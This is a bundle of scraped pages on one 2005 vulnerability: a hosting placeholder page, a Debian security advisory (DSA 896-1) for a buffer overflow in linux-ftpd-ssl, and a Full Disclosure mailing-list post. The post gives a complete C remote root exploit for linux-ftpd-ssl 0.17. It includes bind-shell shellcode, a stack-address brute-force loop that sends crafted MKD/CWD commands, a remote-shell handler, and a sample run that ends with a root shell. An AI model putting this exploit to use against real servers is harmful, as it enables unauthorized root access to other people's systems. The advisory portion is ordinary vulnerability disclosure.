=== Content from www.vupen.com_f2456b45_20250124_195736.html ===

[![](/__ovh/common/img/logo-white.png)](https://www.ovhcloud.com/)

![](/__ovh/common/img/icon-traffic-cone.png)

# Site en construction

![](/__ovh/common/img/shadow.png)

Besoin d'assistance ou d'informations ?

[![](/__ovh/common/img/icon-book.png)
Guides](https://docs.ovh.com/fr/hosting/ "Guides")
[![](/__ovh/common/img/icon-speech-bubble.png)
Forum](https://community.ovh.com/ "Forum")
[![](/__ovh/common/img/icon-user-support.png)
Contact](https://help.ovhcloud.com/fr/ "Contact")
[![](/__ovh/common/img/icon-app-gear.png)
Espace Client](https://www.ovh.com/manager/ "Espace Client")

Â© Copyright 1999 [OVHcloud](https://www.ovhcloud.com/)

v1v2v3v4v5v6v7v8v9v10v11v12v13v14v15v16v17v18v19v20v21v22v23v24v25v26v27v28v29v30v31v32v33v34v35v36v37v38v39v40v41v42v43v44v45v46v47v48v49v50v51v52v53v54v55v56v57v58v59v60v61v62v63v64v65v66v67v68v69v70

u1u2u3u4u5u6u7u8u9u10u11u12u13u14u15u16u17u18u19u20u21u22u23u24u25u26u27u28u29u30u31u32u33u34u35u36u37u38u39u40u41u42u43u44u45u46u47u48u49u50u51u52u53u54u55u56u57u58u59u60u61u62u63u64u65u66u67u68u69

p1p2p3p4p5p6p7p8p9p10p11p12p13p14p15p16p17p18p19p20p21p22p23p24p25p26p27p28p29p30p31p32p33p34p35p36p37p38p39p40p41p42p43p44p45p46p47p48p49p50p51p52p53p54p55p56p57p58p59p60p61p62p63p64

e1e2e3e4e5e6e7e8e9e10e11e12e13e14e15e16e17e18e19e20e21e22e23e24e25e26e27e28e29e30e31e32e33e34e35e36e37e38e39e40e41e42e43e44e45e46e47e48e49e50e51e52e53

n1n2n3n4n5n6n7n8n9n10n11n12n13n14n15n16n17n18n19n20n21n22n23n24n25n26n27n28n29n30n31n32n33n34n35n36n37n38n39n40n41n42n43n44n45n46n47n48n49n50n51n52n53n54n55n56n57n58n59n60n61n62

---

c1c2c3c4c5c6c7c8c9c10c11c12c13c14c15c16c17c18c19c20c21c22c23c24c25c26c27c28c29c30c31c32c33c34c35c36c37c38c39c40c41c42c43c44c45c46c47c48c49c50c51

o1o2o3o4o5o6o7o8o9o10o11o12o13o14o15o16o17o18o19o20o21o22o23o24o25o26o27o28o29o30o31o32o33o34o35o36o37o38o39o40o41o42o43o44o45o46o47o48o49o50o51o52o53o54o55o56o57o58o59o60o61o62o63

m1m2m3m4m5m6m7m8m9m10m11m12m13m14m15m16m17m18m19m20m21m22m23m24m25m26m27m28m29m30m31m32m33m34m35m36m37m38m39m40m41m42m43m44m45m46m47m48m49m50m51m52m53m54m55m56m57m58m59m60m61



=== Content from www.debian.org_70cd738a_20250124_195735.html ===


---

[[Date Prev](msg00293.html)][[Date Next](msg00295.html)]
[[Thread Prev](msg00293.html)][[Thread Next](msg00295.html)]
[[Date Index](maillist.html#00294)]
[[Thread Index](threads.html#00294)]

# [SECURITY] [DSA 896-1] New ftpd-ssl packages fix arbitrary code execution

---

* *To*: debian-security-announce@lists.debian.org (Debian Security Announcements)
* *Subject*: [SECURITY] [DSA 896-1] New ftpd-ssl packages fix arbitrary code execution
* *From*: joey@infodrom.org (Martin Schulze)
* *Date*: Tue, 15 Nov 2005 07:29:34 +0100 (CET)
* *Message-id*: <[[ðŸ”Ž]](/msgid-search/m1EbuJy-000oi8C%40finlandia.Infodrom.North.DE)Â [m1EbuJy-000oi8C@finlandia.Infodrom.North.DE](msg00294.html)>
* *Reply-to*: debian-security@lists.debian.org

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

- --------------------------------------------------------------------------
Debian Security Advisory DSA 896-1                     security@debian.org
<http://www.debian.org/security/>                             Martin Schulze
November 15th, 2005                     <http://www.debian.org/security/faq>
- --------------------------------------------------------------------------

Package        : linux-ftpd-ssl
Vulnerability  : buffer overflow
Problem type   : remote
Debian-specific: no
CVE ID         : CVE-2005-3524
Debian Bug     : 339074

A buffer overflow has been discovered in ftpd-ssl, a simple BSD FTP
server with SSL encryption support, that could lead to the execution
of arbitrary code.

The old stable distribution (woody) does not contain linux-ftpd-ssl
packages.

For the stable distribution (sarge) this problem has been fixed in
version 0.17.18+0.3-3sarge1

For the unstable distribution (sid) this problem will be fixed soon.

We recommend that you upgrade your ftpd-ssl package.

Upgrade Instructions
- --------------------

wget url
        will fetch the file for you
dpkg -i file.deb
        will install the referenced file.

If you are using the apt-get package manager, use the line for
sources.list as given below:

apt-get update
        will update the internal database
apt-get upgrade
        will install corrected packages

You may use an automated update by adding the resources from the
footer to the proper configuration.

Debian GNU/Linux 3.1 alias sarge
- --------------------------------

  Source archives:

    [http://security.debian.org/pool/updates/main/l/linux-ftpd-ssl/linux-ftpd-ssl_0.17.18+0.3-3sarge1.dsc](http://security.debian.org/pool/updates/main/l/linux-ftpd-ssl/linux-ftpd-ssl_0.17.18%2B0.3-3sarge1.dsc)
      Size/MD5 checksum:      640 f1999dff20d8e5c7bebbdf3ae08d9fbc
    [http://security.debian.org/pool/updates/main/l/linux-ftpd-ssl/linux-ftpd-ssl_0.17.18+0.3-3sarge1.diff.gz](http://security.debian.org/pool/updates/main/l/linux-ftpd-ssl/linux-ftpd-ssl_0.17.18%2B0.3-3sarge1.diff.gz)
      Size/MD5 checksum:     5157 bb183553291a97a7505dd3eba1ee28aa
    [http://security.debian.org/pool/updates/main/l/linux-ftpd-ssl/linux-ftpd-ssl_0.17.18+0.3.orig.tar.gz](http://security.debian.org/pool/updates/main/l/linux-ftpd-ssl/linux-ftpd-ssl_0.17.18%2B0.3.orig.tar.gz)
      Size/MD5 checksum:    61388 525f77ad02c5593fa4c5cad9abc337b7

  Alpha architecture:

    [http://security.debian.org/pool/updates/main/l/linux-ftpd-ssl/ftpd-ssl_0.17.18+0.3-3sarge1_alpha.deb](http://security.debian.org/pool/updates/main/l/linux-ftpd-ssl/ftpd-ssl_0.17.18%2B0.3-3sarge1_alpha.deb)
      Size/MD5 checksum:    55448 5e4b657d47730305099a47ec2d8c84df

  AMD64 architecture:

    [http://security.debian.org/pool/updates/main/l/linux-ftpd-ssl/ftpd-ssl_0.17.18+0.3-3sarge1_amd64.deb](http://security.debian.org/pool/updates/main/l/linux-ftpd-ssl/ftpd-ssl_0.17.18%2B0.3-3sarge1_amd64.deb)
      Size/MD5 checksum:    50938 87ab0d101dc0e1c14d38888231abf11f

  ARM architecture:

    [http://security.debian.org/pool/updates/main/l/linux-ftpd-ssl/ftpd-ssl_0.17.18+0.3-3sarge1_arm.deb](http://security.debian.org/pool/updates/main/l/linux-ftpd-ssl/ftpd-ssl_0.17.18%2B0.3-3sarge1_arm.deb)
      Size/MD5 checksum:    49478 d964f72a931cee99c560c1f348b9f733

  Intel IA-32 architecture:

    [http://security.debian.org/pool/updates/main/l/linux-ftpd-ssl/ftpd-ssl_0.17.18+0.3-3sarge1_i386.deb](http://security.debian.org/pool/updates/main/l/linux-ftpd-ssl/ftpd-ssl_0.17.18%2B0.3-3sarge1_i386.deb)
      Size/MD5 checksum:    48598 6092dcf5345c383959b9b8b3a9d9b65f

  Intel IA-64 architecture:

    [http://security.debian.org/pool/updates/main/l/linux-ftpd-ssl/ftpd-ssl_0.17.18+0.3-3sarge1_ia64.deb](http://security.debian.org/pool/updates/main/l/linux-ftpd-ssl/ftpd-ssl_0.17.18%2B0.3-3sarge1_ia64.deb)
      Size/MD5 checksum:    65312 1f80c1ef53e6151a8d7df0ed0f2160cb

  HP Precision architecture:

    [http://security.debian.org/pool/updates/main/l/linux-ftpd-ssl/ftpd-ssl_0.17.18+0.3-3sarge1_hppa.deb](http://security.debian.org/pool/updates/main/l/linux-ftpd-ssl/ftpd-ssl_0.17.18%2B0.3-3sarge1_hppa.deb)
      Size/MD5 checksum:    53384 a247343d426eb9ecff838905432943d8

  Motorola 680x0 architecture:

    [http://security.debian.org/pool/updates/main/l/linux-ftpd-ssl/ftpd-ssl_0.17.18+0.3-3sarge1_m68k.deb](http://security.debian.org/pool/updates/main/l/linux-ftpd-ssl/ftpd-ssl_0.17.18%2B0.3-3sarge1_m68k.deb)
      Size/MD5 checksum:    46112 bedd079aca908ad7f31f7fb8fe0ecab7

  Big endian MIPS architecture:

    [http://security.debian.org/pool/updates/main/l/linux-ftpd-ssl/ftpd-ssl_0.17.18+0.3-3sarge1_mips.deb](http://security.debian.org/pool/updates/main/l/linux-ftpd-ssl/ftpd-ssl_0.17.18%2B0.3-3sarge1_mips.deb)
      Size/MD5 checksum:    52262 fe07040d4d3db4fe2cd4e02c873131ee

  Little endian MIPS architecture:

    [http://security.debian.org/pool/updates/main/l/linux-ftpd-ssl/ftpd-ssl_0.17.18+0.3-3sarge1_mipsel.deb](http://security.debian.org/pool/updates/main/l/linux-ftpd-ssl/ftpd-ssl_0.17.18%2B0.3-3sarge1_mipsel.deb)
      Size/MD5 checksum:    52074 5b1e112532d8b07ab278d036515d85d3

  PowerPC architecture:

    [http://security.debian.org/pool/updates/main/l/linux-ftpd-ssl/ftpd-ssl_0.17.18+0.3-3sarge1_powerpc.deb](http://security.debian.org/pool/updates/main/l/linux-ftpd-ssl/ftpd-ssl_0.17.18%2B0.3-3sarge1_powerpc.deb)
      Size/MD5 checksum:    52050 bd09d568c4e634670c698dbe33cd4775

  IBM S/390 architecture:

    [http://security.debian.org/pool/updates/main/l/linux-ftpd-ssl/ftpd-ssl_0.17.18+0.3-3sarge1_s390.deb](http://security.debian.org/pool/updates/main/l/linux-ftpd-ssl/ftpd-ssl_0.17.18%2B0.3-3sarge1_s390.deb)
      Size/MD5 checksum:    51862 d4cb84830ca8a631ed5e08344e286b18

  Sun Sparc architecture:

    [http://security.debian.org/pool/updates/main/l/linux-ftpd-ssl/ftpd-ssl_0.17.18+0.3-3sarge1_sparc.deb](http://security.debian.org/pool/updates/main/l/linux-ftpd-ssl/ftpd-ssl_0.17.18%2B0.3-3sarge1_sparc.deb)
      Size/MD5 checksum:    48822 d47e7a161940d64f82a7edb87df7ff3e

  These files will probably be moved into the stable distribution on
  its next update.

- ---------------------------------------------------------------------------------
For apt-get: deb <http://security.debian.org/> stable/updates main
For dpkg-ftp: ftp://security.debian.org/debian-security dists/stable/updates/main
Mailing list: debian-security-announce@lists.debian.org
Package info: `apt-cache show <pkg>' and <http://packages.debian.org/><pkg>

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.2 (GNU/Linux)

iD8DBQFDeYBNW5ql+IAeqTIRArSwAKCe8zIfwYxhHJfz2t1cOwzzMV6ZkgCfateo
Z5ly8y1GYmM/ndQxGGxJiFM=
=4CJ2
-----END PGP SIGNATURE-----

```

---



=== Content from seclists.org_07030d3d_20250124_195734.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](139)
[By Date](date.html#140)
[![Next](/images/right-icon-16x16.png)](141)

[![Previous](/images/left-icon-16x16.png)](139)
[By Thread](index.html#140)
[![Next](/images/right-icon-16x16.png)](147)

![](/shared/images/nst-icons.svg#search)

# linux-ftpd-ssl 0.17 warez

---

*From*: kcope <kingcope () gmx net>

*Date*: Sat, 05 Nov 2005 03:49:09 +0100

---

```

hello this is kcope,
i got juarez for you..........................

lnxFTPDssl_warez.c is a remote r00t exploit
for the latest version of linux-ftpd-ssl.
have fun and send me feedback to kingcope[at]gmx.net

-kc

```
```
/*Oct2005 VER2*/
/**********************************************************/
/** lnxFTPDssl_warez.c                                   **/
/** linux-ftpd-ssl 0.17 remote r00t exploit by kcope     **/
/** for all of those who installed the ssl ready version **/
/** of linux-ftpd to be more "secure"                    **/
/**                                                      **/
/** be aware of the buffer overflows,                    **/
/** the code is strong cryto                             **/
/**********************************************************/
/** thanx blackzero,revoguard,wY!,net_spy                **/
/** Confidential. Keep Private!                          **/
/**********************************************************/
/**
C:\Dokumente und Einstellungen\Administrator\Desktop>telnet 192.168.2.9 21
220 localhost.localdomain FTP server (Version 6.4/OpenBSD/Linux-ftpd-0.17) ready.
AUTH SSL
234 AUTH SSL OK.
;PpPpPPpPPPpPPPPpPppPPPPPpPpPPPpPPpPpPPpPPPpPPPPpPppPPPPPpPpPPPpP
C:\Dokumente und Einstellungen\Administrator\Desktop>lnxFTPDssl_warez.exe 192.168.2.9 kcope password
lnxFTPDssl_warez.c
linux-ftpd-ssl 0.17 remote r00t exploit by kcope

connecting to 192.168.2.9:21... ok.
OK - STARTING ATTACK
+++ USING STACK ADDRESS 0xbfffcc03 +++
+++ USING STACK ADDRESS 0xbfffcc13 +++
+++ USING STACK ADDRESS 0xbfffcc23 +++
+++ USING STACK ADDRESS 0xbfffcc33 +++
+++ USING STACK ADDRESS 0xbfffcc43 +++
+++ USING STACK ADDRESS 0xbfffcc53 +++
+++ USING STACK ADDRESS 0xbfffcc63 +++
+++ USING STACK ADDRESS 0xbfffcc73 +++
+++ USING STACK ADDRESS 0xbfffcc83 +++
+++ USING STACK ADDRESS 0xbfffcc93 +++
+++ USING STACK ADDRESS 0xbfffcca3 +++
+++ USING STACK ADDRESS 0xbfffccb3 +++
+++ USING STACK ADDRESS 0xbfffccc3 +++
+++ USING STACK ADDRESS 0xbfffccd3 +++
+++ USING STACK ADDRESS 0xbfffcce3 +++
+++ USING STACK ADDRESS 0xbfffccf3 +++
+++ USING STACK ADDRESS 0xbfffcd03 +++
+++ USING STACK ADDRESS 0xbfffcd13 +++
+++ USING STACK ADDRESS 0xbfffcd23 +++
+++ USING STACK ADDRESS 0xbfffcd33 +++
+++ USING STACK ADDRESS 0xbfffcd43 +++
+++ USING STACK ADDRESS 0xbfffcd53 +++
+++ USING STACK ADDRESS 0xbfffcd63 +++
+++ USING STACK ADDRESS 0xbfffcd73 +++
+++ USING STACK ADDRESS 0xbfffcd83 +++
+++ USING STACK ADDRESS 0xbfffcd93 +++
+++ USING STACK ADDRESS 0xbfffcda3 +++
+++ USING STACK ADDRESS 0xbfffcdb3 +++
+++ USING STACK ADDRESS 0xbfffcdc3 +++
+++ USING STACK ADDRESS 0xbfffcdd3 +++
+++ USING STACK ADDRESS 0xbfffcde3 +++
+++ USING STACK ADDRESS 0xbfffcdf3 +++
+++ USING STACK ADDRESS 0xbfffce03 +++
+++ USING STACK ADDRESS 0xbfffce13 +++
+++ USING STACK ADDRESS 0xbfffce23 +++
+++ USING STACK ADDRESS 0xbfffce33 +++
+++ USING STACK ADDRESS 0xbfffce43 +++
+++ USING STACK ADDRESS 0xbfffce53 +++
+++ USING STACK ADDRESS 0xbfffce63 +++
+++ USING STACK ADDRESS 0xbfffce73 +++
+++ USING STACK ADDRESS 0xbfffce83 +++
+++ USING STACK ADDRESS 0xbfffce93 +++
+++ USING STACK ADDRESS 0xbfffcea3 +++
+++ USING STACK ADDRESS 0xbfffceb3 +++
+++ USING STACK ADDRESS 0xbfffcec3 +++

Let's get ready to rumble!
id
uid=0(root) gid=0(root) egid=1000(kcope) groups=1000(kcope),20(dialout),24(cdrom
),25(floppy),29(audio),44(video),46(plugdev)
uname -a
Linux debian 2.4.27-2-386 #1 Mon May 16 16:47:51 JST 2005 i686 GNU/Linux

**/
// Tested on    Linux 2.4.18-14 Redhat 8.0
//              Linux 2.2.20-idepci Debian GNU 3.0
//              Linux 2.4.27-2-386 Debian GNU 3.1
// CHECK VER3 FOR MORE SUPPORT!!!
// ***KEEP IT ULTRA PRIV8***

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/time.h>
#include <unistd.h>
#include <netdb.h>
#include <errno.h>

#define BUF_SIZ 4096
#define PORT 21
#define BINDPORT 30464
#define STACK_START 0xbfffcc03
#define STACK_END 0xbffff4f0

/*my shellcode*/
/*setreuid,chroot break,
bind to port 30464, 0xff is double*/
unsigned char lnx_bind[] =
"\x90\x90\x90\x90\x90\x90\x90\x90"
"\xEB\x70\x31\xC0\x31\xDB\x31\xC9"
"\xB0\x46\xCD\x80\x5E\x90\xB8\xBE"
"\xff\xff\xff\xff\xff\xff\xF7\xD0"
"\x89\x06\xB0\x27\x8D\x1E\xFE\xC5"
"\xB1\xED\xCD\x80\x31\xC0\x8D\x1E"
"\xB0\x3D\xCD\x80\x66\xB9\xff\xff"
"\x03\xBB\xD2\xD1\xD0\xff\xff\xF7"
"\xDB\x89\x1E\x8D\x1E\xB0\x0C\xCD"
"\x80\xE2\xEF\xB8\xD1\xff\xff\xff"
"\xff\xff\xff\xF7\xD0\x89\x06\xB0"
"\x3D\x8D\x1E\xCD\x80\x31\xC0\x31"
"\xDB\x89\xF1\xB0\x02\x89\x06\xB0"
"\x01\x89\x46\x04\xB0\x06\x89\x46"
"\x08\xB0\x66\x43\xCD\x80\x89\xF1"
"\x89\x06\xB0\x02\x66\x89\x46\x0C"
"\xEB\x04\xEB\x74\xEB\x77\xB0\x77"
"\x66\x89\x46\x0E\x8D\x46\x0C\x89"
"\x46\x04\x31\xC0\x89\x46\x10\xB0"
"\x10\x89\x46\x08\xB0\x66\x43\xCD"
"\x80\xB0\x01\x89\x46\x04\xB0\x66"
"\xB3\x04\xCD\x80\x31\xC0\x89\x46"
"\x04\x89\x46\x08\xB0\x66\xB3\x05"
"\xCD\x80\x88\xC3\xB0\x3F\x31\xC9"
"\xCD\x80\xB0\x3F\xB1\x01\xCD\x80"
"\xB0\x3F\xB1\x02\xCD\x80\xB8\xD0"
"\x9D\x96\x91\xF7\xD0\x89\x06\xB8"
"\xD0\x8C\x97\xD0\xF7\xD0\x89\x46"
"\x04\x31\xC0\x88\x46\x07\x89\x76"
"\x08\x89\x46\x0C\xB0\x0B\x89\xF3"
"\x8D\x4E\x08\x8D\x56\x0C\xCD\x80"
"\xE8\x15\xff\xff\xff\xff\xff\xff";

long ficken() {
        printf("lnxFTPDssl_warez.c\nlinux-ftpd-ssl 0.17 remote r00t exploit by kcope\n\n");
        return 0xc0debabe;
}

void usage(char **argv) {
        printf("Insufficient parameters given.\n");
        printf("Usage: %s <remotehost> <user> <pass> [writeable directory]\n", argv[0]);
        exit(0);
}

void _recv(int sock, char *buf) {
        int bytes=recv(sock, buf, BUFSIZ, 0);
        if (bytes < 0) {
                perror("read() failed");
                exit(1);
        }
}

void attack(int sock, unsigned long ret, char *pad) {
        int i,k;
        char *x=(char*)malloc(1024);
        char *bufm=(char*)malloc(1024);
        char *bufc=(char*)malloc(1024);
        char *rbuf=(char*)malloc(BUFSIZ+10);
        char *nops=(char*)malloc(1024);
        unsigned char a,b,c,d;

        memset(nops,0,1024);
        memset(nops,0x90,255);
        memset(x,0,1024);
        for (i=0,k=0;i<60;i++) {
                a=(ret >> 24) & 0xff;
                b=(ret >> 16) & 0xff;
                c=(ret >> 8) & 0xff;
                d=(ret) & 0xff;

                if (d==255) {
                        x[k]=d;
                        x[++k]=255;
                } else {
                        x[k]=d;
                }

                if (c==255) {
                        x[k+1]=c;
                        x[++k+1]=255;
                } else {
                        x[k+1]=c;
                }

                if (b==255) {
                        x[k+2]=b;
                        x[++k+2]=255;
                } else {
                        x[k+2]=b;
                }

                if (a==255) {
                        x[k+3]=a;
                        x[++k+3]=255;
                } else {
                        x[k+3]=a;
                }

                k+=4;
        }

        snprintf(bufm, 1000, "MKD %s%s\r\n", pad, x); // 1x'A' redhat 8.0 / 2x'A' debian gnu 3.0 / 3x'A' debian gnu 3.1
        snprintf(bufc, 1000, "CWD %s%s\r\n", pad, x);
        for (i=0; i<11; i++) {
                send(sock, bufm, strlen(bufm), 0);
                recv(sock, rbuf, BUFSIZ, 0);
                send(sock, bufc, strlen(bufc), 0);
                recv(sock, rbuf, BUFSIZ, 0);
        }

        for (i=0; i<2; i++) {
                snprintf(bufm, 1000, "MKD %s\r\n", lnx_bind);
                snprintf(bufc, 1000, "CWD %s\r\n", lnx_bind);
                send(sock, bufm, strlen(bufm), 0);
                recv(sock, rbuf, BUFSIZ, 0);
                send(sock, bufc, strlen(bufc), 0);
                recv(sock, rbuf, BUFSIZ, 0);

                snprintf(bufm, 1000, "MKD %s\r\n", nops);
                snprintf(bufc, 1000, "CWD %s\r\n", nops);
                send(sock, bufm, strlen(bufm), 0);
                recv(sock, rbuf, BUFSIZ, 0);
                send(sock, bufc, strlen(bufc), 0);
                recv(sock, rbuf, BUFSIZ, 0);
        }

        send(sock, "XPWD\r\n", strlen("XPWD\r\n"), 0);

        free(bufm);
        free(bufc);
        free(x);
        free(rbuf);
}

int do_remote_shell(int sockfd)
{
        while(1)
         {
            fd_set fds;
            FD_ZERO(&fds);
            FD_SET(0,&fds);
            FD_SET(sockfd,&fds);
            if(select(FD_SETSIZE,&fds,NULL,NULL,NULL))
            {
               int cnt;
               char buf[1024];
               if(FD_ISSET(0,&fds))
               {
                  if((cnt=read(0,buf,1024))<1)
                  {
                     if(errno==EWOULDBLOCK||errno==EAGAIN)
                       continue;
                     else
                       break;
                  }
                  write(sockfd,buf,cnt);
               }
               if(FD_ISSET(sockfd,&fds))
               {
                  if((cnt=read(sockfd,buf,1024))<1)
                  {
                       if(errno==EWOULDBLOCK||errno==EAGAIN)
                         continue;
                       else
                         break;
                  }
                  write(1,buf,cnt);
               }
            }
         }
}

int do_connect (char *remotehost, int port) {
        struct hostent *host;
        struct sockaddr_in addr;
        int s;

        if (!inet_aton(remotehost, &addr.sin_addr))
        {
                host = gethostbyname(remotehost);
                if (!host)
                {
                        perror("gethostbyname() failed");
                        return -1;
                }
                addr.sin_addr = *(struct in_addr*)host->h_addr;
        }

        s = socket(PF_INET, SOCK_STREAM, 0);
        if (s == -1)
        {
                perror("socket() failed");
                return -1;
        }

        addr.sin_port = htons(port);
        addr.sin_family = AF_INET;

        if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) == -1)
        {
                if (port == PORT) perror("connect() failed");
                return -1;
        }

        return s;
}

void do_login(int s, char *buf, char *sendbuf, char *user, char *pass) {
        memset(buf, 0, sizeof(buf));
        memset(sendbuf, 0, sizeof(sendbuf));
        do {
                _recv(s, buf);
        } while (strstr(buf, "220 ") == NULL);
        snprintf(sendbuf, BUFSIZ, "USER %s\r\n", user);
        send(s, sendbuf, strlen(sendbuf), 0);
        do {
                _recv(s, buf);
        } while (strstr(buf, "331 ") == NULL);

        snprintf(sendbuf, BUFSIZ, "PASS %s\r\n", pass);
        send(s, sendbuf, strlen(sendbuf), 0);
        do {
        _recv(s, buf);
        } while (strstr(buf, "230 ") == NULL);
}

int main(int argc, char **argv) {
        char remotehost[255];
        char user[255];
        char pass[255];
        char pad[10];
        char *buf,*sendbuf;
        int stackaddr=STACK_START;
        int s,sr00t,i;

        ficken();
        if (argc < 4)
                usage(argv);

        strncpy(remotehost, argv[1], sizeof(remotehost));
        remotehost[sizeof(remotehost)-1]=0;
        strncpy(user, argv[2], sizeof(user));
        user[sizeof(user)-1]=0;
        strncpy(pass, argv[3], sizeof(pass));
        pass[sizeof(pass)-1]=0;

        printf("connecting to %s:%d...", remotehost, PORT);
        fflush(stdout);

        s=do_connect(remotehost, PORT);

        puts(" ok.");
        buf=(char*)malloc(BUFSIZ+10);
        sendbuf=(char*)malloc(BUFSIZ+10);
        do_login(s, buf, sendbuf, user, pass);

        if (strstr(buf, "230")!=NULL) {
                printf("OK - STARTING ATTACK\n");
                i=0;
                while (stackaddr <= STACK_END) {
                        printf("+++ USING STACK ADDRESS 0x%.08x +++\n", stackaddr);

                        sleep(1);

                        if (i==1) {
                                strcpy(pad, "A");
                        }

                        if (i==2) {
                                strcpy(pad, "AA");
                        }

                        if (i==3) {
                                strcpy(pad, "AAA");
                                i=0;
                        }

                        attack(s, stackaddr, pad);
                        close(s);
                        s=do_connect(remotehost, PORT);
                        do_login(s, buf, sendbuf, user, pass);

                        if (argv[4] != NULL) {
                                snprintf(sendbuf, BUFSIZ, "CWD %s\r\n", argv[4]);
                                send(s, sendbuf, strlen(sendbuf), 0);
                                recv(s, buf, BUFSIZ, 0);
                        }

                        if((sr00t=do_connect(remotehost, BINDPORT)) > 0) {
                                /* XXX Remote r00t */
                                printf("\nLet's get ready to rumble!\n");
                                do_remote_shell(sr00t);
                                exit(0);
                        }

                        stackaddr+=16;
                        i++;
                }
        } else {
                printf("\nLogin incorrect\n");
                exit(1);
        }

        free(buf);
        free(sendbuf);
        return 0;
}

```
```
_______________________________________________
Full-Disclosure - We believe in it.
Charter: <http://lists.grok.org.uk/full-disclosure-charter.html>
Hosted and sponsored by Secunia - <http://secunia.com/>
```

---

[![Previous](/images/left-icon-16x16.png)](139)
[By Date](date.html#140)
[![Next](/images/right-icon-16x16.png)](141)

[![Previous](/images/left-icon-16x16.png)](139)
[By Thread](index.html#140)
[![Next](/images/right-icon-16x16.png)](147)

### Current thread:

* **linux-ftpd-ssl 0.17 warez** *kcope (Nov 05)*
  + [Re: linux-ftpd-ssl 0.17 warez](147) *James Longstreet (Nov 06)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")


